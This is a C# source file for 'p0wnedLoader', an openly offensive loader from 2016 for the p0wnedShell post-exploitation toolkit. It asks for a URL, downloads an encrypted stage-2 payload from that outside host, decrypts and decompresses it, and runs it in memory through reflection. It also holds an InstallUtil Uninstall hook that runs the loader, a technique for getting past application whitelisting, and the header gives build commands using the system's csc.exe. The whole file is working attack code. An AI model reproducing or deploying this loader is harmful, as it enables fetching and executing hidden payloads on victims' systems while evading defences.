/*
         ___                     ____                __       
   ___  / _ \_    _____  ___ ___/ / /  ___  ___ ____/ /__ ____
  / _ \/ // / |/|/ / _ \/ -_) _  / /__/ _ \/ _ `/ _  / -_) __/
 / .__/\___/|__,__/_//_/\__/\_,_/____/\___/\_,_/\_,_/\__/_/   
/_/                                                                        

Loads an Online AES Encrypted version of p0wnedShell - by Cn33liz 2016

Compile as x86:
cd \Windows\Microsoft.NET\Framework\v4.0.30319
csc.exe  /out:"C:\Utils\p0wnedLoaderx86.exe" /platform:x86 "C:\Utils\p0wnedLoader.cs"

Compile as x64:
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
csc.exe  /out:"C:\Utils\p0wnedLoaderx64.exe" /platform:x64 "C:\Utils\p0wnedLoader.cs"

*/

using System;
using System.Net;
using System.Text;
using System.IO;
using System.Security;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;

namespace p0wnedLoader
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        public static void PrintBanner()
        {
            Console.Clear();
            Console.WriteLine(@"          ___                     ____                __           ");
            Console.WriteLine(@"    ___  / _ \_    _____  ___ ___/ / /  ___  ___ ____/ /__ ____    ");
            Console.WriteLine(@"   / _ \/ // / |/|/ / _ \/ -_) _  / /__/ _ \/ _ `/ _  / -_) __/    ");
            Console.WriteLine(@"  / .__/\___/|__,__/_//_/\__/\_,_/____/\___/\_,_/\_,_/\__/_/       ");
            Console.WriteLine(@" /_/                                                               ");
            Console.WriteLine(@"                                                                   ");
            Console.WriteLine(@"           Loads an Online AES Encrypted version of p0wnedShell    ");
            Console.WriteLine(@"                                                By Cn33liz 2016    ");
            Console.WriteLine();
        }

        public static string Get_Stage2(string url)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                WebResponse response = request.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                Environment.Exit(1);
                return null;
            }
        }

        class SecurePass
        {
            SecureString securePwd = new SecureString();

            public SecureString convertToSecureString(string strPassword)
            {
                var secureStr = new SecureString();
                if (strPassword.Length > 0)
                {
                    foreach (var c in strPassword.ToCharArray()) secureStr.AppendChar(c);
                }
                return secureStr;
            }
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                        Environment.Exit(1);
                    }
                }
            }

            return decryptedBytes;
        }

        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }

        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[4096];
                int read;

                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }

                return resultStream.ToArray();
            }
        }

        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }

        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        // remove one character from the list of password characters
                        password = password.Substring(0, password.Length - 1);
                        // get the location of the cursor
                        int pos = Console.CursorLeft;
                        // move the cursor to the left by one character
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        // replace it with space
                        Console.Write(" ");
                        // move the cursor to the left by one character again
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            // add a new line because user pressed enter at the end of their password
            Console.WriteLine();
            return password;
        }

        public static void Launch(byte[] p0wnedEnc)
        {
            // load the bytes into Assembly
            Assembly a = Assembly.Load(p0wnedEnc);
            // search for the Entry Point
            MethodInfo method = a.EntryPoint;
            if (method != null)
            {
                // create an istance of the Startup form Main method
                object o = a.CreateInstance(method.Name);
                // invoke the application starting point
                method.Invoke(o, null);
            }
        }

        public static void Main()
        {
            PrintBanner();
            Console.Write("\n[*] Please enter the p0wnedShell Stage2 URL > ");
            Console.ForegroundColor = ConsoleColor.Green;
            string URL = Console.ReadLine();
            Console.ResetColor();
            Console.WriteLine();
            Console.Write("[*] One moment while getting our Stage2 payload... ".PadRight(56));
            string Stage2 = Get_Stage2(URL);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("-> Done");
            Console.ResetColor();
            Console.WriteLine();

            Console.Write("[*] Now please enter our Decryption Password > ");
            Console.ForegroundColor = ConsoleColor.Green;
            string Password = Program.ReadPassword();
            Console.WriteLine();
            Console.ResetColor();

            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);

            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);

            // Getting the size of salt
            int _saltSize = 4;

            // Removing salt bytes, retrieving original bytes
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }

            Launch(originalBytes);

        }
    }
}